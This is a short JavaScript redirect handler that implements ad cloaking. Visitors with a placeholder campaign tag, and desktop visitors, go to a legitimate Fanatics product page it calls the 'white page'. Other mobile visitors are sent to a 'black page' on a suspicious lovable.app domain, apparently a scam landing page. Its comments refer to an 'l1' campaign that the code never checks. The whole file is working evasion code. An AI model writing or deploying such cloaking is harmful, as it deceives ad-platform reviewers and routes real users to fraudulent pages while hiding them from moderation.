export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.fanatics.com/soccer-national-teams/germany-national-team/germany-national-team-adidas-infant-2022-home-kit-white/o-3690+t-03279445+p-04622277382+z-9-2165802811?_ref=p-GALP:m-GRID:i-r0c0:po-0";
    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }







